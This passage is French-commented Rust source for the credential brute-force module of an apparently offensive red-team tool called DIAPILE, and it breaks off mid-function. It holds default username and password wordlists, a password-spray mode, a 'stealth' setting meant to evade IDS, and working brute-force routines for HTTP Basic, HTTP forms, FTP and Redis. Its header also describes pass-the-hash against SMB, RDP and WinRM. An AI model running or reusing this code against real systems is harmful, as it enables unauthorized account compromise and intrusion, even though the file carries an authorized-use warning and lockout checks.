//! DIAPILE — Module Bruteforce & Credential Checker
//!
//! ÉTAT RÉEL D'IMPLÉMENTATION (à maintenir à jour) :
//!
//! Échanges réseau natifs (implémentation wire réelle) :
//!   FTP, Redis, PostgreSQL (cleartext + MD5),
//!   MongoDB (`OP_MSG` + SCRAM-SHA-256, signature serveur vérifiée), MQTT,
//!   VNC (security-type 1 sans auth **et** security-type 2 DES challenge/réponse),
//!   MySQL (handshake v10 : `mysql_native_password` + `caching_sha2_password`,
//!     mode « fast auth » **et** branche « full authentication » — canal TLS
//!     (`SSLRequest` + bascule `rustls`) ou clé publique RSA-OAEP — avec
//!     bascule `AuthSwitchRequest`),
//!   SMTP (AUTH PLAIN), IMAP (LOGIN), POP3 (USER/PASS), LDAP (simple bind BER),
//!   MSSQL (TDS 7.4 prelogin + Login7),
//!   SMB2/SMB3 (NEGOTIATE jusqu'à **3.1.1** : contextes PREAUTH_INTEGRITY
//!     SHA-512 / ENCRYPTION AES-GCM-CCM / SIGNING AES-CMAC, integrity hash de
//!     pré-authentification chaîné — puis SESSION_SETUP NTLMSSP, NTLMv2 **et
//!     pass-the-hash** ; en 3.1.1 un `TREE_CONNECT` est **signé** en AES-CMAC
//!     avec la clé dérivée par KDF, ce qui éprouve réellement la signature),
//!   RDP NLA / CredSSP (X.224 + TLS + TSRequest DER portant SPNEGO/NTLMSSP,
//!     NTLMv2 **et pass-the-hash**).
//! Enveloppes HTTP (pas de moteur d'authentification, simple POST/GET) :
//!   HTTP Basic, HTTP Form, Kubernetes (endpoints ouverts).
//! WinRM (`/wsman`) : handshake **Negotiate/NTLMSSP** maison sur une connexion
//!   unique (NTLMv2 + pass-the-hash), avec repli HTTP Basic via `reqwest`.
//! Subprocess externe (NON natif) :
//!   SSH   — délègue à `sshpass`/`ssh` s'ils sont présents dans le PATH
//!   autre — repli `hydra` pour les services sans moteur natif (telnet, snmp,
//!     sip, irc, socks5, …) : installé à la demande puis **exécuté**
//!
//! MOTEUR D'EXÉCUTION (`run_credential_attempts`) :
//!   - Parallélisme **borné** par `BruteConfig::max_parallel` (forcé à 1 dès que
//!     `delay_ms > 0`, une temporisation n'ayant de sens que séquentiellement).
//!   - Ordre vertical classique ou **password spray** (`BruteConfig::spray`) qui
//!     teste un mot de passe face à tous les utilisateurs avant de changer.
//!   - **Détection de verrouillage** (`detect_lockout`) : les marqueurs de
//!     blocage renvoyés par le serveur interrompent le scan (`stop_on_lockout`).
//!
//! LIMITES CONNUES :
//!   - `stop_on_success` par défaut : un seul credential trouvé par cible.
//!   - RDP : NLA/CredSSP uniquement — le TLS est assuré par `rustls`, qui ne
//!     supporte ni TLS 1.0 ni les suites RC4 : les serveurs dépourvus de
//!     TLS 1.2 (Windows 2008 R2 non patché) échouent en erreur, non en refus.
//!   - SMB : dialectes 2.0.2 → 3.1.1 négociés ; en 3.1.1 la signature est
//!     **exercée** (clé de signature dérivée par KDF SP800-108 sur l'integrity
//!     hash de pré-authentification, puis `TREE_CONNECT` vers `IPC$` signé en
//!     AES-CMAC) ; le **chiffrement** du flux n'est pas mis en œuvre (aucun
//!     échange de fichiers). En deçà de 3.1.1 le flux reste non signé.
//!   - LDAP : simple bind avec le nom fourni tel quel — sans DN de base ni
//!     domaine, seuls les annuaires acceptant un nom court répondent.
//!   - MSSQL : prelogin en clair (`ENCRYPT_OFF`) ; les serveurs exigeant le
//!     chiffrement du flux rejettent la connexion.
//!   - MySQL : handshake réel. Un serveur annonçant `CLIENT_SSL` reçoit un
//!     `SSLRequest` suivi d'une bascule TLS sur la même socket (seul moyen
//!     d'atteindre un serveur en `require_secure_transport`) ; dans le canal
//!     chiffré, la branche « full authentication » de `caching_sha2_password`
//!     envoie le mot de passe en clair, comme le client officiel. Hors TLS,
//!     cette branche s'appuie sur la clé publique RSA du serveur
//!     (`RSA-OAEP`/SHA-1).
//!   - MongoDB : SCRAM-SHA-256 uniquement (pas de SCRAM-SHA-1 ni de MONGODB-X509
//!     / PLAIN) ; SASLprep n'est pas appliqué au mot de passe et la base
//!     d'authentification est figée à `admin` (pas de `--authenticationDatabase`).
//!   - VNC : seul le challenge/réponse DES du « security type 2 » (RFC 6143) est
//!     testé ; les serveurs en RFB 3.3 (type annoncé en clair) et les schémas
//!     VeNCrypt/TLS ne sont pas pris en charge.
//!
//! LISTES EXTERNES (fichiers `.txt`) :
//!   - `load_wordlist(path)` charge une liste texte (une entrée par ligne,
//!     `#` en tête = commentaire, lignes vides ignorées, `trim`, dédoublonnage
//!     en conservant la première occurrence, plafond `MAX_WORDLIST_ENTRIES`),
//!     résolue via `resolve_config_path`.
//!   - `BruteConfig::load_users` / `load_passwords` fusionnent ce fichier dans
//!     les listes embarquées (`merge_list`) : **additif par défaut**, ou
//!     **remplacement total** avec `replace = true`.
//!   - CLI : `--brute-users <FILE>` et `--brute-passwords <FILE>` s'ajoutent
//!     aux listes embarquées ; `--brute-lists-replace` bascule en remplacement.
//!   - Un mot de passe vide ne peut pas être exprimé par une ligne de fichier :
//!     en mode remplacement, le mot de passe vide embarqué disparaît.
//!   - OPSEC : ces listes restent externes au binaire et hors rapports.
//!
//! ⚠️ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES UNIQUEMENT.
//!    Utilisation non autorisée est illégale.
#![allow(dead_code)]

use crate::ansi::*;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

// ─────────────────────────────────────────────────────────────────────────────
// Types de résultats
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BruteResult {
    pub service: String,
    pub host: String,
    pub port: u16,
    pub username: String,
    pub password: String,
    pub success: bool,
    /// Preuve supplémentaire (banner, response body, session token…)
    pub proof: Option<String>,
    pub duration_ms: u128,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BruteReport {
    pub target: String,
    pub service: String,
    pub total_tried: usize,
    pub successes: Vec<BruteResult>,
    pub duration_ms: u128,
}

/// Clone d'un rapport dont les mots de passe sont masqués — à utiliser pour
/// toute persistance sur disque (sidecar JSON, rapports) conformément à la
/// règle OPSEC : jamais de secret en clair dans les artefacts de scan.
/// L'affichage console destiné à l'opérateur n'utilise pas cette variante.
pub fn mask_report(report: &BruteReport) -> BruteReport {
    let mut masked = report.clone();
    for s in &mut masked.successes {
        s.password = crate::main_helpers::mask_secret(&s.password);
    }
    masked
}

// ─────────────────────────────────────────────────────────────────────────────
// Wordlists intégrées
// ─────────────────────────────────────────────────────────────────────────────

/// Usernames courants pour les services réseau (75 entrées)
pub fn default_usernames() -> Vec<&'static str> {
    vec![
        "admin",
        "administrator",
        "root",
        "user",
        "guest",
        "test",
        "tomcat",
        "manager",
        "jenkins",
        "gitlab",
        "postgres",
        "mysql",
        "sa",
        "oracle",
        "mongodb",
        "redis",
        "elastic",
        "kibana",
        "grafana",
        "nagios",
        "zabbix",
        "ansible",
        "deploy",
        "devops",
        "ubuntu",
        "ec2-user",
        "centos",
        "debian",
        "pi",
        "vagrant",
        "service",
        "svc",
        "operator",
        "support",
        "helpdesk",
        "backup",
        "webmaster",
        "www",
        "nginx",
        "apache",
        "ftp",
        "anonymous",
        "mail",
        "smtp",
        "imap",
        "pop3",
        "ldap",
        "bind",
        "named",
        "docker",
        "kubernetes",
        "k8s",
        "ci",
        "cd",
        "drone",
        "git",
        "svn",
        "dev",
        "developer",
        "intern",
        "readonly",
        "viewer",
        "monitor",
        "ops",
        "sysadmin",
        "netadmin",
        "dbadmin",
        "dba",
        "api",
        "app",
        "web",
        "frontend",
        "backend",
        "sys",
        "system",
        "info",
        "demo",
        "lab",
        "temp",
    ]
}

/// Mots de passe courants (100 entrées)
pub fn default_passwords() -> Vec<&'static str> {
    vec![
        // Default / blank
        "",
        "password",
        "123456",
        "12345678",
        "qwerty",
        "abc123",
        // Equipment defaults
        "admin",
        "admin123",
        "administrator",
        "root",
        "toor",
        // Common patterns
        "letmein",
        "welcome",
        "monkey",
        "dragon",
        "master",
        "login",
        "pass",
        "test",
        "changeme",
        "default",
        // Vendor defaults
        "tomcat",
        "jenkins",
        "manager",
        "grafana",
        "elastic",
        "kibana",
        "rabbitmq",
        "redis",
        "mongo",
        "mysql",
        "postgres",
        "oracle",
        "mssql",
        "sa",
        "system",
        // Years / dates
        "2020",
        "2021",
        "2022",
        "2023",
        "2024",
        "2025",
        "2026",
        "password1",
        "password123",
        "Password1",
        "Password123",
        // Keyboard walks
        "qwerty123",
        "1q2w3e4r",
        "qazwsx",
        "zxcvbn",
        // Service-specific
        "nagiosxi",
        "zabbix",
        "ansible",
        "vagrant",
        "Vagrant",
        "docker",
        "kubernetes",
        "k8s",
        "pi",
        "raspberry",
        "alpine",
        "ubuntu",
        "centos",
        "debian",
        "redhat",
        // Empty user scenarios
        "guest",
        "anonymous",
        "ftp",
        "test123",
        "demo",
        // Capitalised
        "Admin",
        "Admin123",
        "Root",
        "Test",
        "Welcome1",
        // Patterns
        "P@ssw0rd",
        "P@ssword",
        "Passw0rd",
        "Adm1n",
        // Single chars
        "1",
        "0",
        "a",
        "x",
    ]
}

/// Wordlist spécifique aux services web (chemins admin + creds)
pub fn web_admin_paths() -> Vec<&'static str> {
    vec![
        "/admin",
        "/admin/",
        "/administrator",
        "/login",
        "/signin",
        "/dashboard",
        "/panel",
        "/wp-admin",
        "/wp-login.php",
        "/phpmyadmin",
        "/pma",
        "/mysql",
        "/db",
        "/jenkins",
        "/jenkins/",
        "/j/",
        "/grafana",
        "/grafana/login",
        "/kibana",
        "/kibana/login",
        "/portainer",
        "/portainer/#/auth",
        "/api/login",
        "/api/auth",
        "/api/v1/login",
        "/manager/html",
        "/host-manager/html",
        "/console",
        "/console/login",
        "/jmx-console",
        "/web-console",
        "/nagios",
        "/nagiosxi",
        "/zabbix",
        "/roundcube",
        "/webmail",
        "/traefik",
        "/traefik/dashboard",
    ]
}

// ─────────────────────────────────────────────────────────────────────────────
// Listes externes (fichiers .txt)
// ─────────────────────────────────────────────────────────────────────────────

/// Plafond dur d'une liste externe. `rockyou.txt` fait 14 M de lignes : les
/// charger telles quelles coûterait ~1 Go de RAM pour un outil qui n'essaiera
/// de toute façon que `max_attempts` paires.
pub const MAX_WORDLIST_ENTRIES: usize = 100_000;

/// Charge une liste depuis un fichier texte : **un élément par ligne**, les
/// lignes vides et celles commençant par `#` sont ignorées, les espaces de
/// bord sont retirés, les doublons éliminés (première occurrence conservée) et
/// la liste est plafonnée à `MAX_WORDLIST_ENTRIES`.
///
/// Le chemin passe par `resolve_config_path` : un simple nom de fichier est
/// cherché à côté du binaire (layout `target/release/`), comme `config.json`.
pub fn load_wordlist(path: &str) -> Result<Vec<String>, String> {
    let resolved = crate::resolve_config_path(path);
    let raw = std::fs::read_to_string(&resolved)
        .map_err(|e| format!("liste « {} » illisible : {}", resolved, e))?;

    let mut seen = std::collections::HashSet::new();
    let mut out: Vec<String> = Vec::new();
    for line in raw.lines() {
        let item = line.trim();
        if item.is_empty() || item.starts_with('#') {
            continue;
        }
        if !seen.insert(item.to_string()) {
            continue;
        }
        out.push(item.to_string());
        if out.len() >= MAX_WORDLIST_ENTRIES {
            break;
        }
    }

    if out.is_empty() {
        return Err(format!("liste « {} » vide (aucune entrée utile)", resolved));
    }
    Ok(out)
}

/// Dédoublonne en conservant l'ordre d'apparition — utilisé après fusion d'une
/// liste externe avec une liste embarquée.
fn dedup_keep_order(items: &mut Vec<String>) {
    let mut seen = std::collections::HashSet::new();
    items.retain(|i| seen.insert(i.clone()));
}

// ─────────────────────────────────────────────────────────────────────────────
// Configuration
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct BruteConfig {
    pub timeout: Duration,
    /// Parallélisme maximal appliqué par `run_credential_attempts` (ramené à 1
    /// lorsque `delay_ms > 0`, pour ne pas chevaucher les temporisations).
    pub max_parallel: usize,
    /// Délai entre chaque lot de tentatives (mode stealth)
    pub delay_ms: u64,
    /// Arrêter après le premier succès
    pub stop_on_success: bool,
    /// Ordre « password spray » : un mot de passe face à tous les utilisateurs
    /// avant de passer au suivant. Réduit fortement le risque de verrouillage
    /// de compte par rapport à l'ordre vertical classique.
    pub spray: bool,
    /// Interrompre le scan dès qu'un verrouillage de compte est détecté.
    pub stop_on_lockout: bool,
    /// Usernames à tester
    pub usernames: Vec<String>,
    /// Mots de passe à tester
    pub passwords: Vec<String>,
    /// Max de tentatives totales (protection boucle infinie)
    pub max_attempts: usize,
    /// Installation automatique des outils manquants (sshpass)
    pub auto_install: bool,
    /// Consentement automatique pour l'installation
    pub assume_yes: bool,
}

impl Default for BruteConfig {
    fn default() -> Self {
        Self {
            timeout: Duration::from_secs(5),
            max_parallel: 4,
            delay_ms: 0,
            stop_on_success: true,
            spray: false,
            stop_on_lockout: true,
            usernames: default_usernames().iter().map(|s| s.to_string()).collect(),
            passwords: default_passwords().iter().map(|s| s.to_string()).collect(),
            max_attempts: 500,
            auto_install: false,
            assume_yes: false,
        }
    }
}

impl BruteConfig {
    /// Mode stealth — ralentit les tentatives pour éviter les IDS et adopte
    /// l'ordre « password spray » afin de ne pas verrouiller les comptes.
    pub fn stealth() -> Self {
        Self {
            delay_ms: 2000,
            max_parallel: 1,
            spray: true,
            max_attempts: 100,
            ..Self::default()
        }
    }

    /// Mode rapide — wordlist minimale pour détection rapide
    pub fn quick() -> Self {
        let quick_users = vec!["admin", "root", "test", "user", "guest"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let quick_passes = vec![
            "", "admin", "admin123", "password", "123456", "root", "test",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        Self {
            usernames: quick_users,
            passwords: quick_passes,
            max_attempts: 35,
            ..Self::default()
        }
    }

    /// Charge une liste d'utilisateurs externe. Avec `replace`, la liste
    /// embarquée est vidée avant fusion ; sinon le fichier s'y **ajoute**.
    ///
    /// Retourne `(entrées lues dans le fichier, total après fusion)`.
    pub fn load_users(&mut self, path: &str, replace: bool) -> Result<(usize, usize), String> {
        Self::merge_list(&mut self.usernames, path, replace)
    }

    /// Charge une liste de mots de passe externe (mêmes règles que
    /// [`BruteConfig::load_users`]). À noter : le mot de passe **vide** — qui
    /// figure dans la liste embarquée — ne peut pas être exprimé par une ligne
    /// de fichier ; utiliser le mode additif pour le conserver.
    pub fn load_passwords(&mut self, path: &str, replace: bool) -> Result<(usize, usize), String> {
        Self::merge_list(&mut self.passwords, path, replace)
    }

    fn merge_list(
        target: &mut Vec<String>,
        path: &str,
        replace: bool,
    ) -> Result<(usize, usize), String> {
        let items = load_wordlist(path)?;
        if replace {
            target.clear();
        }
        let loaded = items.len();
        target.extend(items);
        dedup_keep_order(target);
        Ok((loaded, target.len()))
    }

    /// Paires (user, pass) à tester, dans l'ordre vertical classique ou en
    /// password spray selon `self.spray`.
    pub fn credential_pairs(&self) -> Vec<(String, String)> {
        let mut pairs = Vec::new();
        let outer: &Vec<String> = if self.spray {
            &self.passwords
        } else {
            &self.usernames
        };
        let inner: &Vec<String> = if self.spray {
            &self.usernames
        } else {
            &self.passwords
        };
        for a in outer {
            for b in inner {
                // En spray : (user = b, pass = a) ; en vertical : (user = a, pass = b).
                let (user, pass) = if self.spray { (b, a) } else { (a, b) };
                pairs.push((user.clone(), pass.clone()));
                if pairs.len() >= self.max_attempts {
                    return pairs;
                }
            }
        }
        pairs
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Moteur d'exécution commun : parallélisme borné, spray, détection verrouillage
// ─────────────────────────────────────────────────────────────────────────────

/// Résultat d'une tentative d'authentification unique.
#[derive(Debug, Clone)]
pub enum AttemptOutcome {
    /// Credential valide — la preuve est conservée dans le rapport.
    Success(String),
    /// Credential refusé (cas normal).
    Failure,
    /// Verrouillage / blocage détecté : on cesse d'insister sur cette cible.
    Locked(String),
    /// Erreur transitoire (réseau, timeout, parsing) — à ignorer.
    Error,
}

/// Marqueurs textuels annonçant un verrouillage de compte ou un blocage
/// temporaire. Volontairement conservateur : mieux vaut arrêter trop tôt que
/// verrouiller un compte en production.
const LOCKOUT_MARKERS: &[&str] = &[
    "locked",
    "lock out",
    "lockout",
    "too many",
    "try again later",
    "temporarily blocked",
    "account disabled",
    "is disabled",
    "exceeded",
    "host is blocked",
    "blocked because of many",
    "denied by policy",
];

/// Détecte un marqueur de verrouillage dans une réponse textuelle serveur.
pub fn detect_lockout(text: &str) -> Option<String> {
    let lc = text.to_lowercase();
    LOCKOUT_MARKERS
        .iter()
        .find(|m| lc.contains(*m))
        .map(|m| (*m).to_string())
}

/// Exécute une liste de paires (user, pass) avec un parallélisme borné par
/// `cfg.max_parallel` (forcé à 1 si `cfg.delay_ms > 0`, car une temporisation
/// n'a de sens que si les tentatives ne se chevauchent pas).
///
/// Retourne le nombre de tentatives réellement effectuées et les succès
/// `(user, pass, preuve)`. Un verrouillage est signalé à l'opérateur sur la
/// sortie d'erreur — jamais via `successes`, qui ne doit contenir que des
/// credentials valides (les appelants prennent `successes.first()` pour un
/// accès obtenu).
async fn run_credential_attempts<F, Fut>(
    pairs: Vec<(String, String)>,
    cfg: &BruteConfig,
    service: &str,
    target: &str,
    attempt: F,
) -> (usize, Vec<(String, String, String)>)
where
    F: Fn(String, String) -> Fut,
    Fut: std::future::Future<Output = AttemptOutcome>,
{
    use futures::stream::StreamExt;

    let parallel = if cfg.delay_ms > 0 {
        1
    } else {
        cfg.max_parallel.max(1)
    };
    let mut total = 0usize;
    let mut successes: Vec<(String, String, String)> = Vec::new();
    let mut stop = false;
    let mut offset = 0usize;

    while offset < pairs.len() && !stop {
        let end = (offset + parallel).min(pairs.len());
        if cfg.delay_ms > 0 {
            tokio::time::sleep(Duration::from_millis(cfg.delay_ms)).await;
        }
        let futs = pairs[offset..end].iter().map(|(u, p)| {
            let u = u.clone();
            let p = p.clone();
            let fut = attempt(u.clone(), p.clone());
            async move { (u, p, fut.await) }
        });
        let results: Vec<(String, String, AttemptOutcome)> = futures::stream::iter(futs)
            .buffer_unordered(parallel)
            .collect()
            .await;
        for (u, p, outcome) in results {
            total += 1;
            match outcome {
                AttemptOutcome::Success(proof) => {
                    successes.push((u, p, proof));
                    if cfg.stop_on_success {
                        stop = true;
                    }
                }
                AttemptOutcome::Locked(marker) => {
                    eprintln!(
                        "  \x1b[31m[{}]\x1b[0m {} — verrouillage détecté pour « {} » ({}) : \
                         arrêt des tentatives sur cette cible",
                        service, target, u, marker
                    );
                    if cfg.stop_on_lockout {
                        stop = true;
                    }
                }
                AttemptOutcome::Failure | AttemptOutcome::Error => {}
            }
        }
        offset = end;
    }
    (total, successes)
}

/// Convertit un succès `(user, pass, preuve)` en `BruteResult` — les erreurs
/// historiques de recopie de champs sont ainsi évitées sur tous les protocoles.
fn brute_result(
    service: &str,
    host: &str,
    port: u16,
    user: String,
    pass: String,
    proof: String,
    elapsed_ms: u128,
) -> BruteResult {
    BruteResult {
        service: service.into(),
        host: host.into(),
        port,
        username: user,
        password: pass,
        success: true,
        proof: Some(proof),
        duration_ms: elapsed_ms,
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 1. HTTP Basic Auth Bruteforce
// ─────────────────────────────────────────────────────────────────────────────

/// Teste les credentials HTTP Basic Auth sur une liste de chemins
pub async fn brute_http_basic(
    host: &str,
    port: u16,
    is_https: bool,
    paths: &[&str],
    cfg: &BruteConfig,
) -> BruteReport {
    let start = std::time::Instant::now();
    let scheme = if is_https { "https" } else { "http" };
    let client = reqwest::Client::builder()
        .timeout(cfg.timeout)
        .danger_accept_invalid_certs(true)
        .redirect(reqwest::redirect::Policy::limited(2))
        .user_agent("Mozilla/5.0 (compatible; NRTG/2.0)")
        .build()
        .unwrap_or_default();

    let mut successes = Vec::new();
    let mut total_tried = 0usize;
    let target = format!("{}:{}", host, port);

    'outer: for path in paths {
        let url = format!("{}://{}:{}{}", scheme, host, port, path);

        // Référence sans credentials : si la ressource répond déjà sans
        // authentification (200 sur une page publique, 404, 500…), alors un
        // statut non-401 après credentials ne prouve rien. Sans cette mesure,
        // toute réponse différente de 401/403 était déclarée « mot de passe
        // trouvé » — faux positifs garantis.
        let baseline_requires_auth = match client.get(&url).send().await {
            Ok(r) => matches!(r.status().as_u16(), 401 | 403),
            Err(_) => false,
        };
        if !baseline_requires_auth {
            continue;
        }

        let (tried, found) = run_credential_attempts(
            cfg.credential_pairs(),
            cfg,
            "http-basic",
            &target,
            |user, pass| {
                let client = client.clone();
                let url = url.clone();
                async move {
                    use base64::Engine;
                    let token = base64::engine::general_purpose::STANDARD
                        .encode(format!("{}:{}", user, pass));
                    match client
                        .get(&url)
                        .header("Authorization", format!("Basic {}", token))
                        .send()
                        .await
                    {
                        Ok(r) => {
                            let status = r.status().as_u16();
                            if (200..400).contains(&status) {
                                AttemptOutcome::Success(format!(
                                    "HTTP {} on {} with {}:{}",
                                    status, url, user, pass
                                ))
                            } else if matches!(status, 401 | 403) {
                                let body = r.text().await.unwrap_or_default();
                                match detect_lockout(&body) {
                                    Some(m) => {
                                        AttemptOutcome::Locked(format!("HTTP {} — {}", status, m))
                                    }
                                    None => AttemptOutcome::Failure,
                                }
                            } else {
                                AttemptOutcome::Failure
                            }
                        }
                        Err(_) => AttemptOutcome::Error,
                    }
                }
            },
        )
        .await;
        total_tried += tried;
        for (user, pass, proof) in found {
            successes.push(brute_result(
                "http-basic",
                host,
                port,
                user,
                pass,
                proof,
                start.elapsed().as_millis(),
            ));
            if cfg.stop_on_success {
                break 'outer;
            }
        }
    }

    BruteReport {
        target: format!("{}:{}", host, port),
        service: "http-basic".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 2. HTTP Form Login Bruteforce
// ─────────────────────────────────────────────────────────────────────────────

/// Paramètres du formulaire HTML de login
#[derive(Debug, Clone)]
pub struct HttpFormConfig {
    pub login_url: String,
    pub user_field: String, // name= du champ username
    pub pass_field: String, // name= du champ password
    /// String qui doit être ABSENTE de la réponse en cas de succès (ex: "Invalid password")
    pub failure_marker: String,
    /// String qui doit être PRÉSENTE en cas de succès (ex: "Dashboard", "Welcome")
    pub success_marker: Option<String>,
}

impl HttpFormConfig {
    pub fn common_forms() -> Vec<Self> {
        vec![
            // Jenkins
            Self {
                login_url: "/j_acegi_security_check".into(),
                user_field: "j_username".into(),
                pass_field: "j_password".into(),
                failure_marker: "Invalid username or password".into(),
                success_marker: Some("Dashboard".into()),
            },
            // Grafana
            Self {
                login_url: "/login".into(),
                user_field: "user".into(),
                pass_field: "password".into(),
                failure_marker: "Invalid username or password".into(),
                success_marker: Some("Home".into()),
            },
            // Kibana
            Self {
                login_url: "/api/security/login".into(),
                user_field: "username".into(),
                pass_field: "password".into(),
                failure_marker: "Invalid".into(),
                success_marker: Some("statusCode".into()),
            },
            // Generic
            Self {
                login_url: "/login".into(),
                user_field: "username".into(),
                pass_field: "password".into(),
                failure_marker: "wrong password".into(),
                success_marker: None,
            },
            Self {
                login_url: "/admin/login".into(),
                user_field: "username".into(),
                pass_field: "password".into(),
                failure_marker: "incorrect".into(),
                success_marker: None,
            },
        ]
    }
}

pub async fn brute_http_form(
    host: &str,
    port: u16,
    is_https: bool,
    form: &HttpFormConfig,
    cfg: &BruteConfig,
) -> BruteReport {
    let start = std::time::Instant::now();
    let scheme = if is_https { "https" } else { "http" };
    let base_url = format!("{}://{}:{}", scheme, host, port);
    let login_url = format!("{}{}", base_url, form.login_url);

    let client = reqwest::Client::builder()
        .timeout(cfg.timeout)
        .danger_accept_invalid_certs(true)
        .redirect(reqwest::redirect::Policy::limited(3))
        .user_agent("Mozilla/5.0 (compatible; NRTG/2.0)")
        .build()
        .unwrap_or_default();

    let mut successes = Vec::new();
    let mut total_tried = 0usize;
    let target = format!("{}:{}", host, port);

    let (tried, found) = run_credential_attempts(
        cfg.credential_pairs(),
        cfg,
        "http-form",
        &target,
        |user, pass| {
            let client = client.clone();
            let login_url = login_url.clone();
            let user_field = form.user_field.clone();
            let pass_field = form.pass_field.clone();
            let failure_marker = form.failure_marker.to_lowercase();
            let success_marker = form.success_marker.clone();
            async move {
                let mut form_data = HashMap::new();
                form_data.insert(user_field.as_str(), user.as_str());
                form_data.insert(pass_field.as_str(), pass.as_str());

                match client.post(&login_url).form(&form_data).send().await {
                    Ok(r) => {
                        let status = r.status().as_u16();
                        match r.text().await {
                            Ok(body) => {
                                let body_lc = body.to_lowercase();
                                let failed = body_lc.contains(&failure_marker)
                                    || status == 401
                                    || status == 403;
                                let succeeded = if let Some(sm) = &success_marker {
                                    body_lc.contains(&sm.to_lowercase()) && !failed
                                } else {
                                    !failed && (200..400).contains(&status)
                                };
                                if succeeded {
                                    let snippet = body.chars().take(200).collect::<String>();
                                    AttemptOutcome::Success(format!(
                                        "Login {}:{} → HTTP {} | {}",
                                        user, pass, status, snippet
                                    ))
                                } else if failed {
                                    match detect_lockout(&body) {
                                        Some(m) => AttemptOutcome::Locked(format!(
                                            "HTTP {} — {}",
                                            status, m
                                        )),
                                        None => AttemptOutcome::Failure,
                                    }
                                } else {
                                    AttemptOutcome::Failure
                                }
                            }
                            Err(_) => AttemptOutcome::Error,
                        }
                    }
                    Err(_) => AttemptOutcome::Error,
                }
            }
        },
    )
    .await;
    total_tried += tried;
    for (user, pass, proof) in found {
        successes.push(brute_result(
            "http-form",
            host,
            port,
            user,
            pass,
            proof,
            start.elapsed().as_millis(),
        ));
    }

    BruteReport {
        target: format!("{}:{}", host, port),
        service: "http-form".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 3. FTP Bruteforce
// ─────────────────────────────────────────────────────────────────────────────

pub async fn brute_ftp(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let target = format!("{}:{}", host, port);

    let (total_tried, found) = run_credential_attempts(
        cfg.credential_pairs(),
        cfg,
        "ftp",
        &target,
        |user, pass| async move { try_ftp_login(host, port, &user, &pass, cfg.timeout).await },
    )
    .await;

    let successes = found
        .into_iter()
        .map(|(u, p, proof)| {
            brute_result("ftp", host, port, u, p, proof, start.elapsed().as_millis())
        })
        .collect();

    BruteReport {
        target,
        service: "ftp".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}

async fn try_ftp_login(
    host: &str,
    port: u16,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> AttemptOutcome {
    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut stream)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return AttemptOutcome::Error;
    };

    let mut buf = vec![0u8; 1024];
    // Bannière
    let Ok(Ok(n)) = tokio::time::timeout(timeout, stream.read(&mut buf)).await else {
        return AttemptOutcome::Error;
    };
    let banner = String::from_utf8_lossy(&buf[..n]).to_string();
    if !banner.starts_with("220") {
        return AttemptOutcome::Failure;
    }

    // USER
    let user_cmd = format!("USER {}\r\n", user);
    if tokio::time::timeout(timeout, stream.write_all(user_cmd.as_bytes()))
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }
    let Ok(Ok(n)) = tokio::time::timeout(timeout, stream.read(&mut buf)).await else {
        return AttemptOutcome::Error;
    };
    let user_resp = String::from_utf8_lossy(&buf[..n]).to_string();
    // 331 = mot de passe requis ; 230 = déjà authentifié (anonyme)
    if !user_resp.starts_with("331") && !user_resp.starts_with("230") {
        return match detect_lockout(&user_resp) {
            Some(m) => AttemptOutcome::Locked(format!("FTP {} — {}", user_resp.trim(), m)),
            None => AttemptOutcome::Failure,
        };
    }
    if user_resp.starts_with("230") {
        return AttemptOutcome::Success(format!(
            "FTP login no-password (230 après USER) : {}:{}",
            user, pass
        ));
    }

    // PASS
    let pass_cmd = format!("PASS {}\r\n", pass);
    if tokio::time::timeout(timeout, stream.write_all(pass_cmd.as_bytes()))
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }
    let Ok(Ok(n)) = tokio::time::timeout(timeout, stream.read(&mut buf)).await else {
        return AttemptOutcome::Error;
    };
    let pass_resp = String::from_utf8_lossy(&buf[..n]).to_string();

    if pass_resp.starts_with("230") {
        // 230 = Login successful
        let _ = stream.write_all(b"QUIT\r\n").await;
        AttemptOutcome::Success(format!(
            "FTP credentials valides (230 Login OK) : {}:{} — {}",
            user,
            pass,
            pass_resp.lines().next().unwrap_or("")
        ))
    } else if let Some(m) = detect_lockout(&pass_resp) {
        AttemptOutcome::Locked(format!("FTP {} — {}", pass_resp.trim(), m))
    } else {
        AttemptOutcome::Failure
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 4. Redis AUTH Bruteforce
// ─────────────────────────────────────────────────────────────────────────────

pub async fn brute_redis(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let target = format!("{}:{}", host, port);
    let mut successes = Vec::new();
    let mut total_tried = 0usize;

    // Test sans authentification en premier.
    total_tried += 1;
    if let Ok(Some(proof)) = try_redis_auth(host, port, None, cfg.timeout).await {
        successes.push(BruteResult {
            service: "redis".into(),
            host: host.into(),
            port,
            username: "".into(),
            password: "(no auth)".into(),
            success: true,
            proof: Some(proof),
            duration_ms: start.elapsed().as_millis(),
        });
        if cfg.stop_on_success {
            return BruteReport {
                target,
                service: "redis".into(),
                total_tried,
                successes,
                duration_ms: start.elapsed().as_millis(),
            };
        }
    }

    let (tried, found) = run_credential_attempts(
        cfg.credential_pairs(),
        cfg,
        "redis",
        &target,
        |_user, pass| async move {
            match try_redis_auth(host, port, Some(&pass), cfg.timeout).await {
                Ok(Some(proof)) => AttemptOutcome::Success(proof),
                Ok(None) => AttemptOutcome::Failure,
